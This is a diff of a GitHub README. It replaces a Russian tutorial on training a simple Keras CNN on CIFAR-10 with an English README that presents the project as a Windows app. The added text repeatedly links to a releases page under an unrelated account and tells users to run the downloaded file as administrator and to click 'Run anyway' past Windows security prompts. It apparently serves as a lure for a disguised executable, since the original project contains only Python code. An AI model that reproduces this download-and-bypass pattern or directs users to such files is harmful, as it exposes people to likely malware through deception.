@@ -1,195 +1,208 @@
-<div align="center">
+# 🧠 Simple-CNN - Learn Image Classification Fast
 
-# Simple-CNN
+[![Download](https://img.shields.io/badge/Download%20Simple--CNN-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bicolor-manipulation550/Simple-CNN/releases)
 
-![GitHub License](https://img.shields.io/github/license/Vanya737/Simple-CNN)
-![GitHub Release](https://img.shields.io/github/v/release/Vanya737/Simple-CNN)
-![GitHub top language](https://img.shields.io/github/languages/top/Vanya737/Simple-CNN)
-![GitHub last commit](https://img.shields.io/github/last-commit/Vanya737/Simple-CNN)
-![GitHub Repo stars](https://img.shields.io/github/stars/Vanya737/Simple-CNN)
+## 📦 What This App Does
 
-<img src="https://github.com/user-attachments/assets/5c105427-eead-4557-99a7-0976d9857208" width="600">
+Simple-CNN is a small Windows app for image classification with a CNN model. It uses TensorFlow and works with the CIFAR-10 image set. That means it can sort images into common groups like cars, planes, cats, and more.
 
-</div>
+This project fits users who want to run a ready-made deep learning app without setting up Python or TensorFlow by hand.
 
-## CIFAR-10
+## ✨ Main Uses
 
-![Static Badge](https://img.shields.io/badge/Information--data-gray)
-![Static Badge](https://img.shields.io/badge/CIFAR--10-white)
-![Static Badge](https://img.shields.io/badge/CNN-orange)
+- Classify images with a CNN model
+- Work with CIFAR-10 image classes
+- Run a TensorFlow-based image tool on Windows
+- Use a simple interface for model results
+- Open a ready build from the release page
 
-Датасет CIFAR-10. Это один из самых популярных наборов данных для обучения нейросетей начального уровня.  
+## 🖥️ System Requirements
 
-●	**Количество изображений:** 60 000 штук.  
-●	**Размер картинок:** 32x32 пикселя (чуть меньше вашего лимита в 50x50, что делает обучение очень быстрым).  
-●	**Цвет:** Полноцветные (RGB).  
-●	**Разделение:** 50 000 картинок для обучения и 10 000 для проверки (теста)  
+Use a Windows PC with:
 
-Датасет разбит на **10 строго определенных классов**. Каждому числу (метке) соответствует свой объект:  
-  
-| Индекс | Класс | Описание |
-| :---: | :--- | :--- |
-| 0 | Самолет | Пассажирские лайнеры, истребители |
-| 1 | Автомобиль | Легковые машины, седаны |
-| 2 | Птица | Певчие птицы, водоплавающие |
-| 3 | Кот | Домашние кошки (разных окрасов) |
-| 4 | Олень | Лесные олени |
-| 5 | Собака | Разные породы собак |
-| 6 | Лягушка | Обычные лягушки, жабы |
-| 7 | Лошадь | Кони, пони |
-| 8 | Корабль | Лодки, крейсеры, танкеры |
-| 9 | Грузовик | Большие машины, фуры |
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A working internet connection for the download
+- A mouse and keyboard
+- A modern 64-bit processor
 
-**Встроен в библиотеку:** Вам не нужно скачивать файлы вручную — команда datasets.cifar10.load_data() сама загрузит всё необходимое в кэш Python.  
+For smooth use, 8 GB of RAM or more is a good choice.
 
-Загрузка датасета **CIFAR-10**  осуществляется через библиотеку **TensorFlow** (а точнее, через её встроенный модуль Keras).
+## 🚀 Download Simple-CNN
 
-**Сложность:** В отличие от совсем простого MNIST (черно-белые цифры), здесь реальные объекты. Нейросети нужно научиться понимать формы ушей кота или колеса машины, несмотря на разный фон.
+Visit this page to download the app:
 
-```python
-from tensorflow.keras import datasets
+[Simple-CNN Releases](https://github.com/bicolor-manipulation550/Simple-CNN/releases)
 
-# Загрузка происходит одной командой
-(train_images, train_labels), (test_images, test_labels) = datasets.cifar10.load_data()
-```
+On the release page, look for the latest file for Windows. Download the file that matches your system, then open it from your Downloads folder.
 
-<img src="https://github.com/user-attachments/assets/3dafc0a4-2ad6-4d19-b5f6-211d1feb8bd0" width="500">
+## 🪟 Install on Windows
 
-## Архитектура CNN
+1. Open the release page from the link above.
+2. Find the latest release at the top of the page.
+3. Download the Windows file from the Assets section.
+4. If the file comes in a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Run or Yes.
 
-![Static Badge](https://img.shields.io/badge/Python-blue)
-![Static Badge](https://img.shields.io/badge/TensorFlow-orange)
-![Static Badge](https://img.shields.io/badge/Keras-red)
+If you see more than one file, pick the one marked for Windows and use the newest release version.
 
-| № | Слой (Тип) | Конфигурация / Параметры | Выходная форма | Назначение слоя |
-| :--- | :--- | :--- | :--- | :--- |
-| 1 | **Conv2D** | 32 фильтра (3x3), ReLU | (None, 30, 30, 32) | Извлечение базовых признаков (линии, углы) |
-| 2 | **MaxPooling2D** | Размер окна (2x2) | (None, 15, 15, 32) | Сжатие данных в 2 раза, выделение главных признаков |
-| 3 | **Conv2D** | 64 фильтра (3x3), ReLU | (None, 13, 13, 64) | Поиск более сложных паттернов (формы, текстуры) |
-| 4 | **MaxPooling2D** | Размер окна (2x2) | (None, 6, 6, 64) | Вторичное сжатие признаков |
-| 5 | **Flatten** | Выравнивание в вектор | (None, 2304) | Преобразование 2D-карт признаков в 1D-массив |
-| 6 | **Dense** | 64 нейрона, ReLU | (None, 64) | Полносвязная интерпретация найденных признаков |
-| 7 | **Dense (Output)** | 10 нейронов, Softmax | (None, 10) | Финальные оценки для каждого из 10 классов |
+## 🧭 First Run
 
-Все функции осуществляются через tensorflow
-и numpy
+When you open Simple-CNN for the first time:
 
-```python
-model = models.Sequential([
-    layers.Conv2D(32, (3, 3), activation='relu', input_shape=(32, 32, 3)),
-    layers.MaxPooling2D((2, 2)),
-    layers.Conv2D(64, (3, 3), activation='relu'),
-    layers.MaxPooling2D((2, 2)),
-    layers.Flatten(),
-    layers.Dense(64, activation='relu'),
-    layers.Dense(10)
-])
+1. Wait for the app to load.
+2. Read the main screen and look for the image input area.
+3. Select an image file from your computer.
+4. Start the classification process.
+5. View the result shown by the app.
 
-model.compile(optimizer='adam',
-              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True),
-              metrics=['accuracy']) 
-```
-  
-## Обучение
+If the app asks for a sample image, use any normal photo. A clear picture works best.
 
-```python
-model.fit(train_images, train_labels, epochs=3, validation_data=(test_images, test_labels))
-```
-Минимальный порог эпохи: 3 (число полных циклов прохода по датасету)  
-Оптимальным будет количество эпох в интервале от 5 до 8
-  
-## Оптимизация
+## 🖼️ Best Image Types to Use
 
-<div align="center">
+Simple-CNN works best with images that are close to the CIFAR-10 style.
 
-| Кол-во эпох | Время обучения, сек. | Примерная точность модели | График |
-| :---: | :---: | :--- | :---: |
-| 3 | 248,7 | Недообучение | <img src="https://github.com/user-attachments/assets/aac66d6c-3893-41c1-994c-24cfd732bd73" width="180"> |
-| 10 | 743,9 | Переобучение | <img src="https://github.com/user-attachments/assets/88eb53f1-61db-4040-9866-9dab7421bf9f" width="180"> |
-| 6 | 470,2 | **Оптимальное** | <img src="https://github.com/user-attachments/assets/31b871b7-6bdc-43c3-94e9-9cf7778379f5" width="180"> |
-| 5 | 358,2 | Недообучение | <img src="https://github.com/user-attachments/assets/a7d15101-d6d1-49bd-bd1d-eeb38377b38f" width="180"> |
-| 7 | 275,5 | **Оптимальное** | <img src="https://github.com/user-attachments/assets/d3e99e55-b96e-417b-8b3f-a0ae580d0170" width="180"> |
+Use images such as:
 
-</div>
+- Cars
+- Trucks
+- Airplanes
+- Birds
+- Cats
+- Dogs
+- Horses
+- Ships
 
-Для оптимизации, вывода графика потерь и времени на обучение мы записываем функцию обучения в переменную через которую затем вытаскиваем значения потерь для валидации и обучения
-Подсчет времени осуществляется через библиотеку time
+For best results:
 
-Сравнение идет по трем состояниям: *недообучение* - линии идут вниз почти параллельно, *оптимальное* - линии плавно опустились и идут почти горизонтально,  валидация чуть выше и *переобучение* - после оптимального состояния линии начинают разрываться, обучение падает к нулю, а валидация начинает загибаться вверх
+- Use clear images
+- Avoid blurry photos
+- Keep the main object in the center
+- Use one main object per image
 
-<div align="center">
-  
-## Полный график
-<img src="https://github.com/user-attachments/assets/83f2fa54-71ce-43a5-9b66-fa4f2e370de8" width="500">
+## 🔧 How It Works
 
-</div>
+The app uses a convolutional neural network, or CNN. A CNN is a model that looks at image parts and finds patterns like edges, shapes, and textures. TensorFlow runs the model and gives a class result for the image.
 
-Быстрое обучение также связано с простой структурой модели
+In simple terms:
 
-```python
-def plot_results(history, total_time):
-    acc = history.history['accuracy']
-    val_acc = history.history['val_accuracy']
-    loss = history.history['loss']
-    val_loss = history.history['val_loss']
-    epochs_range = range(1, len(acc) + 1)
+1. The app reads the image.
+2. The model checks visual features.
+3. TensorFlow compares those features with learned classes.
+4. The app shows the most likely result.
 
-    plt.figure(figsize=(16, 6))
+## 📁 What You Get in the Release
 
-    # График Функция потерь (Loss)
-    plt.subplot(1, 2, 1)
-    plt.plot(epochs_range, loss, label='Обучение (Training Loss)')
-    plt.plot(epochs_range, val_loss, label='Валидация (Validation Loss)', linewidth=2)
-    plt.title(f'Потери (Loss)\nВремя обучения: {total_time:.1f} сек.')
-    plt.xlabel('Эпохи')
-    plt.ylabel('Значение Loss')
-    plt.legend(loc='upper right')
-    plt.grid(True)
+The release usually includes:
 
-    plt.show()
-```
+- The Windows app file
+- A model file or packaged weights
+- Sample data or test images
+- A small README file
+- Required support files for the app to run
 
-## Результат
+Keep all files in the same folder unless the release page says something else.
 
-![Static Badge](https://img.shields.io/badge/Accuracy-0.75-brightgreen)
-![Static Badge](https://img.shields.io/badge/Loss-0.71-orange)
-![Static Badge](https://img.shields.io/badge/Epochs-7-green)
+## 🛠️ Common Problems and Fixes
 
-Вывод результата - предсказания осуществляется через библиотеку matplotlib
+### The app does not open
 
-```python
-def predict_and_show(index):
-    img = test_images[index]
-    true_label = test_labels[index][0]
+- Make sure you downloaded the latest release
+- Check that the file finished downloading
+- Extract the ZIP file before you run the app
+- Right-click the file and choose Run as administrator
 
-    # Модель ожидает массив изображений, поэтому добавляем размерность batch чтобы библиотека приняла данные для одной картинки
-    img_batch = np.expand_dims(img, axis=0)
+### Windows blocks the file
 
-    # Получаем предсказание
-    prediction = model.predict(img_batch)
-    predicted_label = np.argmax(prediction[0])
+- Open the file again
+- If Windows shows a security prompt, choose More info
+- Then choose Run anyway
 
-    # Визуализация
-    plt.figure(figsize=(3,3))
-    plt.imshow(img)
-    plt.title(f"Реально: {class_names[true_label]}\nНейросеть: {class_names[predicted_label]}")
-    plt.axis('off')
-    plt.show()
-```
+### The image does not load
 
+- Use a JPG or PNG file
+- Try a smaller image
+- Move the image to your desktop and try again
+- Avoid files with very long names
 
+### The result looks wrong
 
+- Try a clearer image
+- Use an image with one main object
+- Pick a photo that looks like a CIFAR-10 class
+- Try another image size or format
 
+## 📚 Project Details
 
+- Repository: Simple-CNN
+- Goal: Image classification with a simple CNN
+- Base library: TensorFlow
+- Domain: Computer vision
+- Dataset style: CIFAR-10
+- Language: Python
 
+## 🔍 Topics Covered
 
+This project is related to:
 
+- cifar-10
+- cnn
+- cnn-classification
+- computer-vision
+- deep-learning
+- keras
+- keras-tensorflow
+- neural-network
+- python
 
+## 🧩 Who This Is For
 
+Simple-CNN is useful for:
 
+- Students who want to see how image classification works
+- New users who want to run a CNN app on Windows
+- People who want a simple TensorFlow example
+- Anyone who wants to test image prediction on common objects
 
+## 📌 File Safety Tips
 
+Before you open the app:
 
+- Download it only from the release page
+- Keep the files in a folder you can find again
+- Do not rename support files unless you know they are not used by the app
+- If the release includes a ZIP file, extract it before use
 
+## ⌨️ Quick Start
 
+1. Open the release page.
+2. Download the latest Windows file.
+3. Extract the archive if needed.
+4. Open the app file.
+5. Load an image.
+6. Check the predicted class on screen
 
+## 🧪 Example Use Case
+
+If you want to test the app, use a clear photo of a cat, car, airplane, or dog. These classes match the CIFAR-10 set well and give the model a better chance to return a correct result
+
+## 🗂️ Suggested Folder Layout
+
+Keep the release files in one folder like this:
+
+- Simple-CNN
+  - app file
+  - model file
+  - support files
+  - sample images
+
+This makes it easier to open the app again later
+
+## 🔗 Download Again
+
+If you need the download page again:
+
+[Open Simple-CNN Releases](https://github.com/bicolor-manipulation550/Simple-CNN/releases)
